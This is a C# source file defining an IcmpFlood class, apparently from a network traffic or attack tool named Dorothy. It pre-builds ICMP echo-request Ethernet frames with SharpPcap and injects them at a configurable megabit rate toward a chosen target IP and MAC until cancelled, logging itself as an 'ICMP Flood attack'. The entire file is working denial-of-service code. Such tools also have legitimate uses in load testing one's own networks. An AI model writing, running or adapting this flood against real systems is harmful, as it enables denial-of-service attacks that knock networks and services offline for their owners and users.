using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    /// <summary>
    /// ICMP Echo Request flood using SharpPcap Layer-2 injection.
    ///
    /// Switching from raw socket to SharpPcap ensures:
    ///  - The PacketSent event carries the full Ethernet frame (L2 bytes), so the UI's
    ///    Mbps display uses the same byte count as the wire-level rate controller — making
    ///    displayed Mbps == entered Mbps.
    ///  - No dependency on OS raw-socket rate-limiting or per-socket overhead caps.
    /// </summary>
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public event EventHandler<PacketEventArgs>? PacketSent;

        public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        private static ushort IcmpChecksum(byte[] data)
        {
            long sum = 0;
            int i = 0;
            while (i < data.Length - 1) { sum += (data[i] << 8) | data[i + 1]; i += 2; }
            if (i < data.Length) sum += data[i] << 8;
            while (sum >> 16 != 0) sum = (sum & 0xFFFF) + (sum >> 16);
            return (ushort)~sum;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr =>
                        addr.Addr.ipAddress != null &&
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var random = new Random();
                const int payloadSize = 1400;
                const int icmpHeaderSize = 8;
                const int icmpTotalSize = icmpHeaderSize + payloadSize; // 1408 bytes
                const int poolSize = 500;

                // Pre-generate packet pool.
                // Each ICMP packet has a freshly randomized payload and a correct checksum.
                // Using separate objects per pool slot avoids any PacketDotNet caching issue.
                var packetPool = new byte[poolSize][];

                for (int i = 0; i < poolSize; i++)
                {
                    var icmpRaw = new byte[icmpTotalSize];
                    icmpRaw[0] = 8;  // Type: Echo Request
                    icmpRaw[1] = 0;  // Code: 0
                    // Identifier: use lower 16 bits of process ID
                    int pid = Environment.ProcessId;
                    icmpRaw[4] = (byte)(pid >> 8);
                    icmpRaw[5] = (byte)pid;
                    // Sequence number per pool slot
                    icmpRaw[6] = (byte)(i >> 8);
                    icmpRaw[7] = (byte)i;
                    // Randomize payload
                    random.NextBytes(icmpRaw.AsSpan(icmpHeaderSize));
                    // Compute ICMP checksum (bytes 2-3 zeroed by default from new byte[])
                    ushort cs = IcmpChecksum(icmpRaw);
                    icmpRaw[2] = (byte)(cs >> 8);
                    icmpRaw[3] = (byte)cs;

                    var icmpPacket = new IcmpV4Packet(new ByteArraySegment(icmpRaw));
                    var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                    {
                        Protocol = PacketDotNet.ProtocolType.Icmp,
                        TimeToLive = _params.Ttl,
                        Id = (ushort)random.Next(0, 65536)
                    };
                    var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);

                    ipPacket.PayloadPacket = icmpPacket;
                    ethernetPacket.PayloadPacket = ipPacket;
                    // Compute IP header checksum (ICMP has no IP pseudo-header)
                    ipPacket.UpdateCalculatedValues();

                    packetPool[i] = ethernetPacket.Bytes;
                }

                // L2 frame = Eth(14) + IP(20) + ICMP(1408) = 1442 bytes
                // Wire = L2 + FCS(4) = 1446 bytes — matches rate control accounting
                int wirePacketSize = packetPool[0].Length + 4;
                double targetMbps = _params.BytesPerSecond * 8.0 / 1_000_000;
                Logger.Info($"ICMP packet: {packetPool[0].Length} bytes ({wirePacketSize} bytes on wire), target={targetMbps:F2} Mbps");

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    long bytesSent = 0;
                    long targetBytesPerSecond = _params.BytesPerSecond;

                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500;
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3;

                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0;
                    int poolIdx = 0;

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);

                            if (bytesSent < allowedBytes)
                            {
                                long bytesBehind = allowedBytes - bytesSent;
                                // Dynamic burst cap: higher burst at high rates to prevent underrun
                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10);
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, maxBurst);

                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    _device.SendPacket(packetPool[poolIdx]);
                                    OnPacketSent(packetPool[poolIdx], _params.SourceIp, _params.DestinationIp, 0);
                                    bytesSent += wirePacketSize;
                                    poolIdx = (poolIdx + 1) % poolSize;
                                }
                            }
                            else
                            {
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                    Thread.Sleep(0);
                                else
                                    Thread.SpinWait(10);
                            }

                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;

                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);

                                smoothedActualMbps = smoothedActualMbps == 0
                                    ? actualMbps
                                    : (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);

                                Logger.Info($"ICMP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");

                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending ICMP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "ICMP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
}
